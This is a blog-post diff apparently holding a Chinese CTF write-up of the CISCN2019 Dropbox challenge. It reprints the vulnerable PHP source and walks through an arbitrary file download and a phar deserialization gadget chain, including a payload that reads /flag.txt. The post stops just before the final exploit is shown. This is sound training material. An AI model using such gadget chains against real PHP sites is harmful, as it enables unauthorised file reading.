@@ -1,0 +1,694 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    CISCN2019Web1 Dropbox深度解读 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-CISCN2019Web1-Dropbox深度解读"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  CISCN2019Web1 Dropbox深度解读
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/05/30/CISCN2019Web1-Dropbox%E6%B7%B1%E5%BA%A6%E8%A7%A3%E8%AF%BB/" class="article-date">
+  <time datetime="2021-05-30T07:40:58.000Z" itemprop="datePublished">2021-05-30</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/">web技术学习</a> / <a class="article-category-link" href="/categories/web%E6%8A%80%E6%9C%AF%E5%AD%A6%E4%B9%A0/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">phar反序列化</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">1.9k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">10 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <p>题目打开是一个登录框 尝试sql注入 无果</p>
+<p>注册用户  进入 发现文件上传的点</p>
+<p>发现文件任意下载  下载了<strong>index.php<code>、</code>download.php<code>和</code>class.php<code>以及</code>delete.php</strong></p>
+<h2 id="任意下载"><a href="#任意下载" class="headerlink" title="任意下载"></a>任意下载</h2><p>下面附上源码:</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> FileList(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$a</span>-&gt;Name();</span><br><span class="line"><span class="variable">$a</span>-&gt;Size();</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//省略了无关的html页面代码</span></span><br></pre></td></tr></table></figure>
+
+<p>download.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line">ini_set(<span class="string">&quot;open_basedir&quot;</span>, getcwd() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>) &amp;&amp; stristr(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    Header(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . basename(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;close();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>delete.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line">chdir(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (strlen(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;open(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;detele();</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    Header(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> json_encode(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$dbaddr</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&quot;dropbox&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> mysqli(<span class="variable">$dbaddr</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db = <span class="variable">$db</span>; <span class="comment">//引用全局变量$db</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">user_exist</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;store_result();</span><br><span class="line">        <span class="variable">$count</span> = <span class="variable">$stmt</span>-&gt;num_rows;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$count</span> === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">add_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;ss&quot;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">verify_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;user_exist(<span class="variable">$username</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$password</span> = sha1(<span class="variable">$password</span> . <span class="string">&quot;SiAchGHmFx&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="keyword">$this</span>-&gt;db-&gt;prepare(<span class="string">&quot;SELECT `password` FROM `users` WHERE `username` = ?;&quot;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;s&quot;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_result(<span class="variable">$expect</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;fetch();</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expect</span>) &amp;&amp; <span class="variable">$expect</span> === <span class="variable">$password</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;db-&gt;close(); <span class="comment">//User类$db调用close函数，而User类没有close函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$results</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$funcs</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$path</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;files = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;results = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;funcs = <span class="keyword">array</span>();</span><br><span class="line">        <span class="variable">$filenames</span> = scandir(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;.&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line">        <span class="variable">$key</span> = array_search(<span class="string">&quot;..&quot;</span>, <span class="variable">$filenames</span>);</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable">$filenames</span>[<span class="variable">$key</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$filenames</span> <span class="keyword">as</span> <span class="variable">$filename</span>) &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="keyword">new</span> File();</span><br><span class="line">            <span class="variable">$file</span>-&gt;open(<span class="variable">$path</span> . <span class="variable">$filename</span>);</span><br><span class="line">            array_push(<span class="keyword">$this</span>-&gt;files, <span class="variable">$file</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()] = <span class="keyword">array</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$func</span>, <span class="variable">$args</span></span>) </span>&#123;<span class="comment">//调用魔法函数__call</span></span><br><span class="line">        array_push(<span class="keyword">$this</span>-&gt;funcs, <span class="variable">$func</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;files <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;results[<span class="variable">$file</span>-&gt;name()][<span class="variable">$func</span>] = <span class="variable">$file</span>-&gt;<span class="variable">$func</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="string">&#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;thead&gt;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;funcs <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$func</span>) . <span class="string">&#x27;&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;results <span class="keyword">as</span> <span class="variable">$filename</span> =&gt; <span class="variable">$result</span>) &#123;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;tr&gt;&#x27;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$result</span> <span class="keyword">as</span> <span class="variable">$func</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">                <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27;</span> . htmlentities(<span class="variable">$value</span>) . <span class="string">&#x27;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27;</span> . htmlentities(<span class="variable">$filename</span>) . <span class="string">&#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&#x27;</span>;</span><br><span class="line">            <span class="variable">$table</span> .= <span class="string">&#x27;&lt;/tr&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$table</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params"><span class="variable">$filename</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$filename</span>;</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="variable">$filename</span>) &amp;&amp; !is_dir(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">name</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> basename(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">size</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$size</span> = filesize(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="variable">$units</span> = <span class="keyword">array</span>(<span class="string">&#x27; B&#x27;</span>, <span class="string">&#x27; KB&#x27;</span>, <span class="string">&#x27; MB&#x27;</span>, <span class="string">&#x27; GB&#x27;</span>, <span class="string">&#x27; TB&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$size</span> &gt;= <span class="number">1024</span> &amp;&amp; <span class="variable">$i</span> &lt; <span class="number">4</span>; <span class="variable">$i</span>++) <span class="variable">$size</span> /= <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">return</span> round(<span class="variable">$size</span>, <span class="number">2</span>).<span class="variable">$units</span>[<span class="variable">$i</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">detele</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        unlink(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);<span class="comment">//调用file_get_contents</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>开始代码审计</p>
+<p>找到一个 危险函数file_get_contents方法</p>
+<p>在class.php的 File类中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">close</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);<span class="comment">//调用file_get_contents</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>这题利用的 phar反序列化  参:<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2715">https://xz.aliyun.com/t/2715</a></p>
+<p>trips</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php-ini里phar.readonly前面;(分号)要删    ;(分号)在php-ini里就是注释的意思</span><br></pre></td></tr></table></figure>
+
+<p>开解 (我的第一想法)</p>
+<p>在File类中，close方法存在file_get_contents()函数，在User中，会调用改方法$this-&gt;db-&gt;close()，如果有回显的化，我们就可以直接构造payload：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$filename</span> = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="keyword">new</span> File();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>然后放到正常的phar格式生成文件后，就可以了。<br>但无法输出</p>
+<p>那我们只能另辟蹊径了</p>
+<p>发现在 class.php的 Filelist 类中有一个 __call 魔术方法</p>
+<p>那么我们就让$this-&gt;db = new FileList()，让它去调用close，然后调用__call(),然后再调用 __destruct()函数，打印结果  也许大家不太明白为什么这里可以这样 我来详细解读一下  call  和 destruct()</p>
+<p>先放上 exp</p>
